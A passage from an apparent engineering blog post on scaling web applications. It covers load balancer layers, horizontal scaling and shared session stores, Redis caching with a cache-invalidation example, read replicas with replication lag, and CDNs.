balancers operate at different layers:</p><ul><li><p><strong>Layer 4 (Transport)</strong><span>: Routes based on IP and port. Fast, but can’t inspect HTTP headers.</span></p></li><li><p><strong>Layer 7 (Application)</strong><span>: Routes based on HTTP headers, URLs, cookies. More flexible, slightly more overhead.</span></p></li></ul><p>For most web applications, Layer 7 load balancing is preferable because it enables:</p><ul><li><p><span>Path-based routing (</span><code>/api/*</code><span> to API servers, </span><code>/static/*</code><span> to CDN)</span></p></li><li><p>Header-based routing (different versions for mobile vs desktop)</p></li><li><p>SSL termination at the load balancer</p></li><li><p>Request/response inspection for security</p></li></ul><p>Before adding more servers, you might ask: why not just get a bigger server? This is the classic vertical vs horizontal scaling trade-off.</p><p><strong>Vertical scaling</strong><span> means moving to a larger server. It works well early on and usually requires no code changes. But you eventually run into two problems: hard hardware limits and rapidly increasing costs. </span></p><p>Bigger machines are priced non-linearly, so doubling CPU or memory can cost 3–4x more. And even the largest instances have a ceiling.</p><p><strong>Horizontal scaling</strong><span> means adding more servers. It is harder at first because your application must be </span><strong>stateless</strong><span>, so any server can handle any request. But it gives you effectively unlimited capacity and built-in redundancy. If one server fails, the system keeps running.</span></p><p><span>This is where horizontal scaling gets tricky. If a user logs in and their session lives in </span><strong>Server 1’s memory</strong><span>, what happens when the next request lands on </span><strong>Server 2</strong><span>? From the app’s perspective, the session is missing, so the user looks logged out.</span></p><p><span>This is the </span><strong>stateful server problem</strong><span>, and it’s the biggest obstacle to horizontal scaling.</span></p><p>There are two common ways to handle it:</p><p>The load balancer routes all requests from the same user to the same server, typically using a cookie or IP hash.</p><p>Pros:</p><ul><li><p>Requires no application changes</p></li><li><p>Works with any session storage</p></li></ul><p>Cons:</p><ul><li><p>If that server fails, the user loses their session</p></li><li><p>Uneven load distribution if some users are more active than others</p></li><li><p>Limits true horizontal scaling (can’t freely move users between servers)</p></li><li><p>New servers take time to “warm up” with sessions</p></li></ul><p><span>Move session data out of the application servers into a shared store like </span><strong>Redis</strong><span> or </span><strong>Memcached</strong><span>.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!YpnN!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe63f85e2-22f2-4a48-85bf-95dd6d784d5c_624x471.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!YpnN!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe63f85e2-22f2-4a48-85bf-95dd6d784d5c_624x471.png 424w, https://substackcdn.com/image/fetch/$s_!YpnN!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe63f85e2-22f2-4a48-85bf-95dd6d784d5c_624x471.png 848w, https://substackcdn.com/image/fetch/$s_!YpnN!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe63f85e2-22f2-4a48-85bf-95dd6d784d5c_624x471.png 1272w, https://substackcdn.com/image/fetch/$s_!YpnN!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe63f85e2-22f2-4a48-85bf-95dd6d784d5c_624x471.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!YpnN!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe63f85e2-22f2-4a48-85bf-95dd6d784d5c_624x471.png" width="588" height="443.8269230769231" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/e63f85e2-22f2-4a48-85bf-95dd6d784d5c_624x471.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:471,&quot;width&quot;:624,&quot;resizeWidth&quot;:588,&quot;bytes&quot;:41089,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe63f85e2-22f2-4a48-85bf-95dd6d784d5c_624x471.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!YpnN!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe63f85e2-22f2-4a48-85bf-95dd6d784d5c_624x471.png 424w, https://substackcdn.com/image/fetch/$s_!YpnN!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe63f85e2-22f2-4a48-85bf-95dd6d784d5c_624x471.png 848w, https://substackcdn.com/image/fetch/$s_!YpnN!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe63f85e2-22f2-4a48-85bf-95dd6d784d5c_624x471.png 1272w, https://substackcdn.com/image/fetch/$s_!YpnN!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe63f85e2-22f2-4a48-85bf-95dd6d784d5c_624x471.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Now any server can handle any request because session data is centralized. This is the pattern most large-scale systems use. The added latency of a Redis lookup (sub-millisecond) is negligible compared to the flexibility it provides.</p><p>You can now handle more traffic and survive server failures. But as your user base grows, you’ll notice something: no matter how many application servers you add, they’re all hammering the same database. The database is becoming your next bottleneck.</p><p>With 10,000+ users, a new bottleneck emerges: your database. Every request hits the database, and as traffic grows, query latency increases. The database that handled 100 QPS (queries per second) fine starts struggling at 1,000 QPS. </p><p>Read-heavy applications (which most are, with read-to-write ratios of 10:1 or higher) suffer especially hard.</p><p><span>This stage introduces three complementary solutions: </span><strong>caching</strong><span>, </span><strong>read replicas</strong><span>, and </span><strong>CDNs</strong><span>. Together, they can reduce database load by 90% or more.</span></p><p>Most web applications follow the 80/20 rule: 80% of requests access 20% of the data. A product page viewed 10,000 times doesn’t need 10,000 database queries. The user’s profile that loads on every page view doesn’t need to be fetched fresh each time.</p><p>Caching stores frequently accessed data in memory for near-instant retrieval. While database queries take 1-100ms, cache reads take 0.1-1ms.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!xvPD!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77126385-84af-4ed2-81fb-f8610da54796_1036x215.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!xvPD!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77126385-84af-4ed2-81fb-f8610da54796_1036x215.png 424w, https://substackcdn.com/image/fetch/$s_!xvPD!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77126385-84af-4ed2-81fb-f8610da54796_1036x215.png 848w, https://substackcdn.com/image/fetch/$s_!xvPD!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77126385-84af-4ed2-81fb-f8610da54796_1036x215.png 1272w, https://substackcdn.com/image/fetch/$s_!xvPD!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77126385-84af-4ed2-81fb-f8610da54796_1036x215.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!xvPD!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77126385-84af-4ed2-81fb-f8610da54796_1036x215.png" width="1036" height="215" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/77126385-84af-4ed2-81fb-f8610da54796_1036x215.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:215,&quot;width&quot;:1036,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:38447,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77126385-84af-4ed2-81fb-f8610da54796_1036x215.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!xvPD!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77126385-84af-4ed2-81fb-f8610da54796_1036x215.png 424w, https://substackcdn.com/image/fetch/$s_!xvPD!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77126385-84af-4ed2-81fb-f8610da54796_1036x215.png 848w, https://substackcdn.com/image/fetch/$s_!xvPD!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77126385-84af-4ed2-81fb-f8610da54796_1036x215.png 1272w, https://substackcdn.com/image/fetch/$s_!xvPD!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77126385-84af-4ed2-81fb-f8610da54796_1036x215.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>The most common caching pattern is </span><strong>cache-aside</strong><span> (also called lazy loading):</span></p><ol><li><p>Application checks the cache first</p></li><li><p>If data exists (cache hit), return it immediately</p></li><li><p>If not (cache miss), query the database</p></li><li><p>Store the result in cache for future requests (with TTL)</p></li><li><p>Return the data</p></li></ol><p>Redis and Memcached are the standard choices here. Redis is more feature-rich (supports data structures like lists, sets, sorted sets; persistence; pub/sub; Lua scripting), while Memcached is simpler and slightly faster for pure key-value caching.</p><p>Most teams choose Redis because the additional features are useful (using sorted sets for leaderboards, lists for queues, etc.), and the performance difference is negligible.</p><p>Not everything should be cached. Good cache candidates include:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!Yox4!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F631419f2-b691-4368-b270-6d660476e4d7_649x221.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!Yox4!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F631419f2-b691-4368-b270-6d660476e4d7_649x221.png 424w, https://substackcdn.com/image/fetch/$s_!Yox4!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F631419f2-b691-4368-b270-6d660476e4d7_649x221.png 848w, https://substackcdn.com/image/fetch/$s_!Yox4!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F631419f2-b691-4368-b270-6d660476e4d7_649x221.png 1272w, https://substackcdn.com/image/fetch/$s_!Yox4!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F631419f2-b691-4368-b270-6d660476e4d7_649x221.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!Yox4!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F631419f2-b691-4368-b270-6d660476e4d7_649x221.png" width="649" height="221" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/631419f2-b691-4368-b270-6d660476e4d7_649x221.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:221,&quot;width&quot;:649,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:41542,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F631419f2-b691-4368-b270-6d660476e4d7_649x221.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!Yox4!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F631419f2-b691-4368-b270-6d660476e4d7_649x221.png 424w, https://substackcdn.com/image/fetch/$s_!Yox4!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F631419f2-b691-4368-b270-6d660476e4d7_649x221.png 848w, https://substackcdn.com/image/fetch/$s_!Yox4!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F631419f2-b691-4368-b270-6d660476e4d7_649x221.png 1272w, https://substackcdn.com/image/fetch/$s_!Yox4!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F631419f2-b691-4368-b270-6d660476e4d7_649x221.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><strong>Poor cache candidates:</strong></p><ul><li><p>Highly personalized data (different for every user, low reuse)</p></li><li><p>Frequently changing data (constant invalidation overhead)</p></li><li><p>Large blobs (consumes memory without proportional benefit)</p></li><li><p>Transactional data where staleness causes issues</p></li></ul><p>The hardest part of caching isn’t adding it, it’s keeping it accurate. When underlying data changes, cached data becomes stale. This is famously one of the “two hard problems in computer science.”</p><p><strong>Common strategies include:</strong></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!lz77!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e7239d5-b3d5-4f77-b022-dba3789704b7_708x294.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!lz77!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e7239d5-b3d5-4f77-b022-dba3789704b7_708x294.png 424w, https://substackcdn.com/image/fetch/$s_!lz77!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e7239d5-b3d5-4f77-b022-dba3789704b7_708x294.png 848w, https://substackcdn.com/image/fetch/$s_!lz77!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e7239d5-b3d5-4f77-b022-dba3789704b7_708x294.png 1272w, https://substackcdn.com/image/fetch/$s_!lz77!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e7239d5-b3d5-4f77-b022-dba3789704b7_708x294.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!lz77!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e7239d5-b3d5-4f77-b022-dba3789704b7_708x294.png" width="708" height="294" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/2e7239d5-b3d5-4f77-b022-dba3789704b7_708x294.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:294,&quot;width&quot;:708,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:60140,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e7239d5-b3d5-4f77-b022-dba3789704b7_708x294.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!lz77!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e7239d5-b3d5-4f77-b022-dba3789704b7_708x294.png 424w, https://substackcdn.com/image/fetch/$s_!lz77!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e7239d5-b3d5-4f77-b022-dba3789704b7_708x294.png 848w, https://substackcdn.com/image/fetch/$s_!lz77!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e7239d5-b3d5-4f77-b022-dba3789704b7_708x294.png 1272w, https://substackcdn.com/image/fetch/$s_!lz77!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e7239d5-b3d5-4f77-b022-dba3789704b7_708x294.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Most systems start with TTL-based expiration (set cache to expire after 5-60 minutes) and add explicit invalidation for data where staleness causes problems. For example:</p><pre><code>def update_user_profile(user_id, new_data):
    # Update database
    db.update("users", user_id, new_data)
    # Invalidate cache
    cache.delete(f"user:{user_id}")</code></pre><p>The next read will miss the cache and fetch fresh data from the database.</p><p><span>Even with caching, some requests will still hit the database, especially </span><strong>writes</strong><span> and </span><strong>cache misses</strong><span>. Read replicas help by distributing read traffic across multiple copies of the database.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!7waW!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3b6ec905-207f-4781-9e2f-cc7a44798613_524x579.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!7waW!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3b6ec905-207f-4781-9e2f-cc7a44798613_524x579.png 424w, https://substackcdn.com/image/fetch/$s_!7waW!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3b6ec905-207f-4781-9e2f-cc7a44798613_524x579.png 848w, https://substackcdn.com/image/fetch/$s_!7waW!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3b6ec905-207f-4781-9e2f-cc7a44798613_524x579.png 1272w, https://substackcdn.com/image/fetch/$s_!7waW!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3b6ec905-207f-4781-9e2f-cc7a44798613_524x579.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!7waW!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3b6ec905-207f-4781-9e2f-cc7a44798613_524x579.png" width="524" height="579" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/3b6ec905-207f-4781-9e2f-cc7a44798613_524x579.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:579,&quot;width&quot;:524,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:57418,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3b6ec905-207f-4781-9e2f-cc7a44798613_524x579.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!7waW!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3b6ec905-207f-4781-9e2f-cc7a44798613_524x579.png 424w, https://substackcdn.com/image/fetch/$s_!7waW!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3b6ec905-207f-4781-9e2f-cc7a44798613_524x579.png 848w, https://substackcdn.com/image/fetch/$s_!7waW!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3b6ec905-207f-4781-9e2f-cc7a44798613_524x579.png 1272w, https://substackcdn.com/image/fetch/$s_!7waW!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3b6ec905-207f-4781-9e2f-cc7a44798613_524x579.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>The primary database handles all writes. Changes are then replicated (usually asynchronously) to one or more </span><strong>read replicas</strong><span>. Your application sends read queries to replicas and keeps the write workload on the primary, which reduces contention and improves overall throughput.</span></p><p><span>One important consideration is </span><strong>replication lag</strong><span>. Since replication is often asynchronous (for performance), replicas might be milliseconds to seconds behind the primary.</span></p><p>For most applications, this is acceptable. If a social media feed is a second behind, most users will not notice. But some flows require stronger consistency.</p><p><span>A common failure mode is </span><strong>read-your-writes consistency</strong><span>:</span></p><p>A user updates their profile and refreshes immediately. If that read lands on a replica that has not caught up, they see old data and assume the update failed.</p><p><strong>Solutions:</strong></p><ol><li><p><strong>Read from primary after writes</strong><span>: For a short window (N seconds) after a write, route that user’s reads to the primary.</span></p></li><li><p><strong>Session-level consistency</strong><span>: Track the user’s last write timestamp and only read from replicas that have caught up past that point.</span></p></li><li><p><strong>Explicit read-from-primary</strong><span>: For critical reads (viewing just-updated data), always hit the primary.</span></p></li></ol><p>Most frameworks have built-in support for read/write splitting. For example, Rails (ActiveRecord), Django, and Hibernate can route reads to replicas and writes to the primary automatically.</p><p>Static assets like images, CSS, JavaScript, and videos rarely change and don’t need to hit your application servers at all. They’re also the largest files you serve, which makes them expensive in both bandwidth and compute if you serve them directly.</p><p><span>A </span><strong>CDN</strong><span> solves this by caching static assets on globally distributed servers called </span><strong>edge locations</strong><span> (or points of presence).</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!kJei!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe002e51c-50c1-453d-b247-b0592778bf87_2636x476.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!kJei!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe002e51c-50c1-453d-b247-b0592778bf87_2636x476.png 424w, https://substackcdn.com/image/fetch/$s_!kJei!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe002e51c-50c1-453d-b247-b0592778bf87_2636x476.png 848w, https://substackcdn.com/image/fetch/$s_!kJei!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe002e51c-50c1-453d-b247-b0592778bf87_2636x476.png 1272w, https://substackcdn.com/image/fetch/$s_!kJei!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe002e51c-50c1-453d-b247-b0592778bf87_2636x476.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!kJei!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe002e51c-50c1-453d-b247-b0592778bf87_2636x476.png" width="1456" height="263" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/e002e51c-50c1-453d-b247-b0592778bf87_2636x476.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:263,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:88236,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe002e51c-50c1-453d-b247-b0592778bf87_2636x476.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!kJei!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe002e51c-50c1-453d-b247-b0592778bf87_2636x476.png 424w, https://substackcdn.com/image/fetch/$s_!kJei!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe002e51c-50c1-453d-b247-b0592778bf87_2636x476.png 848w, https://substackcdn.com/image/fetch/$s_!kJei!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe002e51c-50c1-453d-b247-b0592778bf87_2636x476.png 1272w, https://substackcdn.com/image/fetch/$s_!kJei!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe002e51c-50c1-453d-b247-b0592778bf87_2636x476.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Here’s what happens when a user in Tokyo requests an image:</p><ul><li><p><span>The request is routed to the </span><strong>CDN edge in Tokyo</strong><span> (low latency, say ~50 ms round trip).</span></p></li><li><p><span>If the file is already cached (</span><strong>cache hit</strong><span>), the CDN serves it immediately.</span></p></li><li><p><span>If it’s not cached (</span><strong>cache miss</strong><span>), the CDN fetches it from your </span><strong>origin</strong><span> (maybe in the US, ~300 ms), stores a copy at the edge, and then returns it to the user.</span></p></li><li><p>The next user in Tokyo gets the cached version from the edge, again at ~50 ms.</p></li></ul><p><span>Popular CDNs include </span><strong>Cloudflare</strong><span> (strong free tier), </span><strong>AWS CloudFront</strong><span>, </span><strong>Fastly</strong><span>, and </span><strong>Akamai</strong><span>.</span></p><p><span>With caching, read replicas, and a CDN in place, your system can handle steady growth. The next challenge is </span><strong>spiky traffic</strong><span>. A viral post, a marketing campaign, or even the difference between 3 AM and 3 PM can create 10x traffic variation. At that point, manually 